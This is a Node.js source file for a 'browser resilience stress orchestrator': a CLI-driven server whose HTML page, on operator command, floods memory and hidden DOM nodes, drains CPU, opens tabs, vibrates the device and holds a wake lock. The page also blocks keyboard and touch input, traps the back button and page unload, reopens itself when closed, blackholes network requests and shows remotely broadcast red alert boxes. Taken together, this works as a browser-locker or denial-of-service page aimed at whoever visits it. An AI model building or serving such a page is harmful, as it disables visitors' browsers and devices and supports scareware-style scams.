const http = require('http');
const readline = require('readline');

const PORT = process.env.PORT || 8080;

// State Machine Definition
let state = {
    active: false,
    multiplier: 1,
    cpuBudget: 10,   // units of work iterations
    memBudget: 50,   // MB
    domBudget: 100,  // element count
    modules: {
        network: false,
        ui: false,
        audio: false,
        haptics: false,
        display: false,
        persistence: false
    },
    tabTarget: 1,
    alertMsg: ''
};

const defaultState = JSON.parse(JSON.stringify(state));

// CLI Interface setup
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: 'stress-ctrl> '
});

console.log('Browser Resilience Stress Orchestrator Initialized.');
console.log('Type "status" for current state or "help" for commands.');
rl.prompt();

rl.on('line', (line) => {
    const args = line.trim().split(/\s+/);
    const cmd = args[0]?.toLowerCase();

    switch (cmd) {
        case 'on':
            state.active = true;
            console.log('[+] Orchestrator ACTIVE');
            break;
        case 'off':
            state.active = false;
            console.log('[-] Orchestrator IDLE');
            break;
        case 'mult':
            const m = parseInt(args[1], 10);
            if (m >= 1 && m <= 10) {
                state.multiplier = m;
                console.log(`[~] Multiplier set to ${m}`);
            } else {
                console.log('[-] Error: Multiplier must be between 1 and 10');
            }
            break;
        case 'cpu':
            const cpu = parseInt(args[1], 10);
            if (!isNaN(cpu)) {
                state.cpuBudget = cpu;
                console.log(`[~] CPU Budget set to ${cpu}`);
            }
            break;
        case 'mem':
            const mem = parseInt(args[1], 10);
            if (!isNaN(mem)) {
                state.memBudget = mem;
                console.log(`[~] Memory Budget set to ${mem} MB`);
            }
            break;
        case 'dom':
            const dom = parseInt(args[1], 10);
            if (!isNaN(dom)) {
                state.domBudget = dom;
                console.log(`[~] DOM Budget set to ${dom}`);
            }
            break;
        case 'mod':
            const modName = args[1]?.toLowerCase();
            const modState = args[2]?.toLowerCase();
            if (state.modules.hasOwnProperty(modName) && (modState === 'on' || modState === 'off')) {
                state.modules[modName] = (modState === 'on');
                console.log(`[~] Module ${modName} -> ${modState}`);
            } else {
                console.log('[-] Error: Invalid module name or state. Valid modules: network, ui, audio, haptics, display, persistence');
            }
            break;
        case 'tabs':
            const tabs = parseInt(args[1], 10);
            if (!isNaN(tabs) && tabs >= 1) {
                state.tabTarget = tabs;
                console.log(`[~] Tab Target set to ${tabs}`);
            }
            break;
        case 'msg':
            state.alertMsg = args.slice(1).join(' ');
            console.log(`[~] Alert broadcasted: "${state.alertMsg}"`);
            break;
        case 'status':
            console.log(JSON.stringify(state, null, 2));
            break;
        case 'reset':
            state = JSON.parse(JSON.stringify(defaultState));
            console.log('[!] State reset to defaults.');
            break;
        case 'help':
            console.log(`Commands:
  on / off                  Toggle orchestrator state
  mult <1-10>               Set global multiplier
  cpu <n> / mem <n> / dom <n> Set specific resource budgets
  mod <name> <on|off>       Toggle module (network, ui, audio, haptics, display, persistence)
  tabs <n>                  Set target number of tabs
  msg <text>                Broadcast alert message
  status                    Print current state
  reset                     Reset all parameters`);
            break;
        default:
            if (cmd) console.log(`[-] Unknown command: ${cmd}`);
            break;
    }
    rl.prompt();
});

// HTML Client Payload Generation
const clientHtml = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>BROWSER RESILIENCE STRESS ORCHESTRATOR</title>
    <style>
        body {
            background-color: #000;
            color: #00ff00;
            font-family: monospace;
            margin: 0;
            padding: 20px;
            overflow-x: hidden;
        }
        body::after {
            content: " ";
            display: block;
            position: fixed;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 99999;
            background-size: 100% 2px, 3px 100%;
            pointer-events: none;
        }
        #statusbar {
            border: 1px solid #00ff00;
            padding: 10px;
            margin-bottom: 20px;
            background: #051105;
        }
        #alert-box {
            display: none;
            position: fixed;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            border: 3px solid #ff0000;
            background: #220000;
            color: #ff0000;
            padding: 40px;
            font-size: 20px;
            font-weight: bold;
            z-index: 100000;
            text-align: center;
        }
        .invisible-dom {
            position: absolute;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <div id="statusbar">INITIALIZING TELEMETRY...</div>
    <div id="alert-box"></div>
    <div id="dom-container"></div>

    <script>
        window.__config = {};
        window.__heap = [];
        let audioCtx = null;
        let oscillators = [];
        let wakeLockObj = null;
        let activeTabs = [];

        // Network Monkey Patching
        const originalFetch = window.fetch;
        const originalXhrOpen = XMLHttpRequest.prototype.open;
        const originalXhrSend = XMLHttpRequest.prototype.send;

        window.fetch = async function(...args) {
            if (window.__config.modules && window.__config.modules.network) {
                // Blackhole or delay
                return new Promise((resolve) => {
                    setTimeout(() => resolve(new Response('Blackholed by Orchestrator')), 5000);
                });
            }
            return originalFetch.apply(this, args);
        };

        XMLHttpRequest.prototype.open = function(method, url, ...rest) {
            this._url = url;
            return originalXhrOpen.call(this, method, url, ...rest);
        };

        XMLHttpRequest.prototype.send = function(...rest) {
            if (window.__config.modules && window.__config.modules.network) {
                setTimeout(() => {
                    this.dispatchEvent(new Event('error'));
                }, 5000);
                return;
            }
            return originalXhrSend.apply(this, rest);
        };

        // Input Governor Handlers
        function handleUIInterception(e) {
            if (window.__config.modules && window.__config.modules.ui) {
                e.preventDefault();
                e.stopPropagation();
            }
        }

        ['touchstart', 'keydown', 'contextmenu', 'gesturestart'].forEach(evt => {
            window.addEventListener(evt, handleUIInterception, { capture: true, passive: false });
        });

        window.addEventListener('beforeunload', (e) => {
            if (window.__config.modules && window.__config.modules.ui) {
                e.returnValue = 'Orchestrator lock engaged.';
                return 'Orchestrator lock engaged.';
            }
        });

        // CPU Worker Generator
        function* cpuGenerator(limit) {
            let i = 0;
            while (i < limit) {
                Math.sqrt(Math.sin(i) * Math.log(i + 1));
                i++;
                yield;
            }
        }

        // Sync Loop (500ms poll)
        async function syncLoop() {
            try {
                const res = await fetch('/config', { cache: 'no-store' });
                const cfg = await res.json();
                window.__config = cfg;

                // Update Status Bar
                document.getElementById('statusbar0')?.remove();
                document.getElementById('statusbar').innerHTML = \`
                    STATUS: \${cfg.active ? 'ACTIVE' : 'IDLE'} | 
                    MULT: \${cfg.multiplier} | 
                    CPU BUDGET: \${cfg.cpuBudget} | 
                    MEM BUDGET: \${cfg.memBudget}MB | 
                    DOM BUDGET: \${cfg.domBudget} | 
                    TABS: \${cfg.tabTarget}
                \`;

                // Alert Box Handling
                const alertBox = document.getElementById('alert-box');
                if (cfg.alertMsg) {
                    alertBox.innerText = cfg.alertMsg;
                    alertBox.style.display = 'block';
                } else {
                    alertBox.style.display = 'none';
                }

                if (!cfg.active) return;

                // Heap Allocator
                const targetBytes = cfg.memBudget * cfg.multiplier * 1024 * 1024;
                let currentBytes = window.__heap.reduce((acc, chunk) => acc + chunk.length, 0);
                if (currentBytes < targetBytes) {
                    const chunk = new Uint8Array(1024 * 1024); // 1MB
                    window.__heap.push(chunk);
                } else if (currentBytes > targetBytes && window.__heap.length > 0) {
                    window.__heap.pop();
                }

                // DOM Factory
                const targetDom = cfg.domBudget * cfg.multiplier;
                const container = document.getElementById('dom-container');
                while (container.children.length < targetDom) {
                    const el = document.createElement('div');
                    el.className = 'invisible-dom';
                    el.innerText = Math.random();
                    container.appendChild(el);
                }
                while (container.children.length > targetDom) {
                    container.removeChild(container.lastChild);
                }

                // CPU Drain via Generator
                const cpuIterations = cfg.cpuBudget * cfg.multiplier * 5000;
                const gen = cpuGenerator(cpuIterations);
                for (let step of gen) { }

                // Audio Thread Handling
                if (cfg.modules.audio) {
                    if (!audioCtx) {
                        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                        oscillators = [];
                        for (let i = 0; i < 8; i++) {
                            const osc = audioCtx.createOscillator();
                            const gain = audioCtx.createGain();
                            osc.frequency.value = 20 + (i * 15);
                            gain.gain.value = 0.01;
                            osc.connect(gain);
                            gain.connect(audioCtx.destination);
                            osc.start();
                            oscillators.push(osc);
                        }
                    }
                } else if (audioCtx) {
                    oscillators.forEach(o => o.stop());
                    audioCtx.close();
                    audioCtx = null;
                    oscillators = [];
                }

                // Haptics Driver
                if (cfg.modules.haptics && navigator.vibrate) {
                    if (Math.random() > 0.5) {
                        navigator.vibrate([200, 100, 200]);
                    }
                }

                // Display Keeper (Wake Lock)
                if (cfg.modules.display && navigator.wakeLock) {
                    if (!wakeLockObj) {
                        navigator.wakeLock.request('screen').then(lock => {
                            wakeLockObj = lock;
                        }).catch(() => {});
                    }
                } else if (wakeLockObj) {
                    wakeLockObj.release().then(() => { wakeLockObj = null; });
                }

                // Tab Spawner
                if (cfg.tabTarget > 1 && activeTabs.length < cfg.tabTarget - 1) {
                    const newTab = window.open(window.location.href, '_blank');
                    if (newTab) activeTabs.push(newTab);
                }

                // Persistence Layer
                if (cfg.modules.persistence) {
                    localStorage.setItem('orchestrator_state', JSON.stringify(cfg));
                    try {
                        const req = indexedDB.open('OrchestratorDB', 1);
                        req.onupgradeneeded = e => e.target.result.createObjectStore('store');
                        req.onsuccess = e => {
                            const db = e.target.result;
                            const tx = db.transaction('store', 'readwrite');
                            tx.objectStore('store').put(cfg, 'state');
                        };
                    } catch(err) {}

                    // Service Worker Injection via Data URI
                    if (!navigator.serviceWorker.controller) {
                        const swCode = \`
                            self.addEventListener('fetch', e => {
                                e.respondWith(fetch(e.request).catch(() => new Response('SW Intercept')));
                            });
                        \`;
                        const swBlob = new Blob([swCode], { type: 'text/javascript' });
                        const swUrl = URL.createObjectURL(swBlob);
                        navigator.serviceWorker.register(swUrl).catch(() => {});
                    }
                }

            } catch (err) {
                console.error('Sync error:', err);
            }
        }

        // UI History Trap
        if (window.__config.modules && window.__config.modules.ui) {
            history.pushState(null, '', location.href);
            window.addEventListener('popstate', () => {
                history.pushState(null, '', location.href);
            });
        }

        // Visibility Change re-lock
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible' && window.__config.modules?.display && navigator.wakeLock && !wakeLockObj) {
                navigator.wakeLock.request('screen').then(lock => { wakeLockObj = lock; }).catch(()=>{});
            }
        });

        // Window Close Override
        window.close = function() {
            if (window.__config.modules?.persistence) {
                window.open(window.location.href, '_blank');
            }
        };

        setInterval(syncLoop, 500);
    </script>
</body>
</html>`;

// HTTP Server
const server = http.createServer((req, res) => {
    if (req.url === '/config') {
        res.writeHead(200, {
            'Content-Type': 'application/json',
            'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
        });
        res.end(JSON.stringify(state));
    } else {
        res.writeHead(200, {
            'Content-Type': 'text/html',
            'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
        });
        res.end(clientHtml);
    }
});

server.listen(PORT, () => {
    console.log(`[Server] Control Plane running at http://localhost:${PORT}`);
});
